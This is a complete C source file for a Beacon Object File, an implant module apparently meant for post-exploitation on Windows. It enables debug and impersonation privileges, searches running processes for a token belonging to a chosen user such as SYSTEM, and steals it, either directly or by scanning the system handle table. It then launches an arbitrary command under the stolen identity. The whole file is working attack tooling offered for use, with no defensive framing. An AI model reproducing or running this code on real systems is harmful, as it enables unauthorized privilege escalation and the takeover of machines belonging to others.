/*
 * bulk_impersonate_bof.c
 *
 * BOF version of bulk_impersonate.c -- targets a user identity and
 * iterates processes until a token is stolen and a command spawned.
 *
 * Arguments (packed via bof_pack):
 *   z-string user_filter  - SID, username, or substring (e.g. "SYSTEM")
 *   z-string command      - command to spawn (e.g. "cmd.exe")
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c -o bulk_impersonate_bof.x64.o bulk_impersonate_bof.c
 */

#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

/* ── ntdll types ───────────────────────────────────────────────────── */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004)
#define SystemHandleInformation 16

typedef struct {
    ULONG       ProcessId;
    UCHAR       ObjectTypeNumber;
    UCHAR       Flags;
    USHORT      Handle;
    PVOID       Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct {
    ULONG                NumberOfHandles;
    SYSTEM_HANDLE_ENTRY  Handles[1];
} SYSTEM_HANDLE_INFORMATION;

/* ── DFR declarations ──────────────────────────────────────────────── */

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DuplicateHandle(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalFree(HLOCAL);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);

DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, SECURITY_IMPERSONATION_LEVEL, TOKEN_TYPE, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
DECLSPEC_IMPORT DWORD  WINAPI ADVAPI32$GetLengthSid(PSID);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$CopySid(DWORD, PSID, PSID);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

DECLSPEC_IMPORT void  *MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void  *MSVCRT$realloc(void*, size_t);
DECLSPEC_IMPORT void   MSVCRT$free(void*);
DECLSPEC_IMPORT void  *MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT void  *MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char*);
DECLSPEC_IMPORT int    MSVCRT$tolower(int);
DECLSPEC_IMPORT char  *MSVCRT$strstr(const char*, const char*);
DECLSPEC_IMPORT int    MSVCRT$_snprintf(char*, size_t, const char*, ...);

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);

/* ── helpers ───────────────────────────────────────────────────────── */

static void enable_priv(const char *name) {
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return;
    if (ADVAPI32$LookupPrivilegeValueA(NULL, name, &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ADVAPI32$AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    }
    KERNEL32$CloseHandle(tok);
}

static PSID get_token_user_sid(HANDLE tok) {
    DWORD len = 0;
    ADVAPI32$GetTokenInformation(tok, TokenUser, NULL, 0, &len);
    if (!len) return NULL;
    TOKEN_USER *tu = MSVCRT$malloc(len);
    if (!tu) return NULL;
    PSID copy = NULL;
    if (ADVAPI32$GetTokenInformation(tok, TokenUser, tu, len, &len)) {
        DWORD slen = ADVAPI32$GetLengthSid(tu->User.Sid);
        copy = MSVCRT$malloc(slen);
        if (copy) ADVAPI32$CopySid(slen, copy, tu->User.Sid);
    }
    MSVCRT$free(tu);
    return copy;
}

static BOOL istrstr(const char *hay, const char *needle) {
    if (!hay || !needle) return FALSE;
    size_t hlen = MSVCRT$strlen(hay), nlen = MSVCRT$strlen(needle);
    char h[512], n[512];
    if (hlen >= sizeof(h)) hlen = sizeof(h) - 1;
    if (nlen >= sizeof(n)) nlen = sizeof(n) - 1;
    for (size_t i = 0; i < hlen; i++) h[i] = (char)MSVCRT$tolower(hay[i]);
    h[hlen] = '\0';
    for (size_t i = 0; i < nlen; i++) n[i] = (char)MSVCRT$tolower(needle[i]);
    n[nlen] = '\0';
    return MSVCRT$strstr(h, n) != NULL;
}

static BOOL token_matches_filter(HANDLE tok, const char *filter) {
    PSID sid = get_token_user_sid(tok);
    if (!sid) return FALSE;
    BOOL match = FALSE;

    char *sid_str = NULL;
    if (ADVAPI32$ConvertSidToStringSidA(sid, &sid_str)) {
        if (istrstr(sid_str, filter)) match = TRUE;
        KERNEL32$LocalFree(sid_str);
    }
    if (!match) {
        char name[256] = {0}, domain[256] = {0}, full[512];
        DWORD nlen = sizeof(name), dlen = sizeof(domain);
        SID_NAME_USE use;
        if (ADVAPI32$LookupAccountSidA(NULL, sid, name, &nlen, domain, &dlen, &use)) {
            MSVCRT$_snprintf(full, sizeof(full), "%s\\%s", domain, name);
            if (istrstr(full, filter) || istrstr(name, filter))
                match = TRUE;
        }
    }
    MSVCRT$free(sid);
    return match;
}

/* Strategy 1: direct OpenProcessToken */
static HANDLE try_direct(DWORD pid) {
    HANDLE proc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) return NULL;
    HANDLE tok = NULL;
    if (!ADVAPI32$OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
        KERNEL32$CloseHandle(proc);
        return NULL;
    }
    HANDLE primary = NULL;
    ADVAPI32$DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL,
                              SecurityImpersonation, TokenPrimary, &primary);
    KERNEL32$CloseHandle(tok);
    KERNEL32$CloseHandle(proc);
    return primary;
}

/* Strategy 2: handle table scan */
static HANDLE try_handle_scan(DWORD pid, SYSTEM_HANDLE_INFORMATION *shi,
                              const char *filter) {
    if (!shi) return NULL;
    HANDLE proc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!proc) return NULL;

    for (ULONG i = 0; i < shi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_ENTRY *e = &shi->Handles[i];
        if (e->ProcessId != pid) continue;

        HANDLE dup = NULL;
        if (!KERNEL32$DuplicateHandle(proc, (HANDLE)(ULONG_PTR)e->Handle,
                KERNEL32$GetCurrentProcess(), &dup,
                TOKEN_QUERY | TOKEN_DUPLICATE, FALSE, 0))
            continue;

        TOKEN_TYPE tt;
        DWORD len;
        if (!ADVAPI32$GetTokenInformation(dup, TokenType, &tt, sizeof(tt), &len)) {
            KERNEL32$CloseHandle(dup);
            continue;
        }

        /* Verify this token actually belongs to the target user */
        if (!token_matches_filter(dup, filter)) {
            KERNEL32$CloseHandle(dup);
            continue;
        }

        HANDLE primary = NULL;
        if (ADVAPI32$DuplicateTokenEx(dup, MAXIMUM_ALLOWED, NULL,
                SecurityImpersonation, TokenPrimary, &primary)) {
            KERNEL32$CloseHandle(dup);
            KERNEL32$CloseHandle(proc);
            return primary;
        }
        KERNEL32$CloseHandle(dup);
    }
    KERNEL32$CloseHandle(proc);
    return NULL;
}

/* ── BOF entry point ───────────────────────────────────────────────── */

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int filt_len = 0, cmd_len = 0;
    char *filter = BeaconDataExtract(&parser, &filt_len);
    char *cmd    = BeaconDataExtract(&parser, &cmd_len);

    if (!filter || !filter[0] || !cmd || !cmd[0]) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: bulk_impersonate <user_filter> <command>");
        return;
    }

    enable_priv("SeDebugPrivilege");
    enable_priv("SeImpersonatePrivilege");

    /* Resolve NtQuerySystemInformation for fallback */
    NtQuerySystemInformation_t pNtQSI = NULL;
    SYSTEM_HANDLE_INFORMATION *shi = NULL;
    HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (ntdll)
        pNtQSI = (NtQuerySystemInformation_t)
            KERNEL32$GetProcAddress(ntdll, "NtQuerySystemInformation");

    if (pNtQSI) {
        ULONG bufsize = 4 * 1024 * 1024;
        NTSTATUS status;
        do {
            shi = MSVCRT$realloc(shi, bufsize);
            if (!shi) break;
            status = pNtQSI(SystemHandleInformation, shi, bufsize, NULL);
            if (status == STATUS_INFO_LENGTH_MISMATCH) bufsize *= 2;
        } while (status == STATUS_INFO_LENGTH_MISMATCH);
        if (!NT_SUCCESS(status)) { MSVCRT$free(shi); shi = NULL; }
    }

    /* Convert command to wide string */
    int wlen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
    WCHAR *wcmd = MSVCRT$malloc(wlen * sizeof(WCHAR));
    if (!wcmd) {
        BeaconPrintf(CALLBACK_ERROR, "Allocation failed");
        MSVCRT$free(shi);
        return;
    }
    KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wlen);

    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed");
        MSVCRT$free(wcmd);
        MSVCRT$free(shi);
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (!KERNEL32$Process32First(snap, &pe)) {
        KERNEL32$CloseHandle(snap);
        MSVCRT$free(wcmd);
        MSVCRT$free(shi);
        return;
    }

    DWORD my_pid = KERNEL32$GetCurrentProcessId();
    int matched = 0, tried = 0;
    BOOL success = FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s  Command: %s", filter, cmd);

    do {
        if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4 ||
            pe.th32ProcessID == my_pid)
            continue;

        /* Check if process runs as target user */
        HANDLE proc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!proc) continue;
        HANDLE qtok = NULL;
        BOOL match = FALSE;
        if (ADVAPI32$OpenProcessToken(proc, TOKEN_QUERY, &qtok)) {
            match = token_matches_filter(qtok, filter);
            KERNEL32$CloseHandle(qtok);
        }
        KERNEL32$CloseHandle(proc);
        if (!match) continue;
        matched++;

        /* Try to steal token */
        HANDLE primary = try_direct(pe.th32ProcessID);
        const char *method = "direct";
        if (!primary) {
            primary = try_handle_scan(pe.th32ProcessID, shi, filter);
            method = "handle scan";
        }
        if (!primary) {
            BeaconPrintf(CALLBACK_OUTPUT, "  PID %-6lu %-22s FAILED", pe.th32ProcessID, pe.szExeFile);
            tried++;
            continue;
        }

        /* Spawn */
        WCHAR *wcmd_copy = MSVCRT$malloc(wlen * sizeof(WCHAR));
        if (!wcmd_copy) { KERNEL32$CloseHandle(primary); tried++; continue; }
        MSVCRT$memcpy(wcmd_copy, wcmd, wlen * sizeof(WCHAR));

        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        MSVCRT$memset(&si, 0, sizeof(si));
        MSVCRT$memset(&pi, 0, sizeof(pi));
        si.cb = sizeof(si);

        if (ADVAPI32$CreateProcessWithTokenW(primary, 0, NULL, wcmd_copy,
                CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] PID %-6lu %-22s [%s] -> Launched PID %lu: %s",
                         pe.th32ProcessID, pe.szExeFile, method, pi.dwProcessId, cmd);
            KERNEL32$CloseHandle(pi.hProcess);
            KERNEL32$CloseHandle(pi.hThread);
            success = TRUE;
            MSVCRT$free(wcmd_copy);
            KERNEL32$CloseHandle(primary);
            break;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "  PID %-6lu %-22s [%s] spawn failed (err %lu)",
                     pe.th32ProcessID, pe.szExeFile, method, KERNEL32$GetLastError());
        MSVCRT$free(wcmd_copy);
        KERNEL32$CloseHandle(primary);
        tried++;
    } while (KERNEL32$Process32Next(snap, &pe));

    if (!success)
        BeaconPrintf(CALLBACK_ERROR, "Failed to spawn. Matched %d, tried %d", matched, tried);

    KERNEL32$CloseHandle(snap);
    MSVCRT$free(wcmd);
    MSVCRT$free(shi);
}
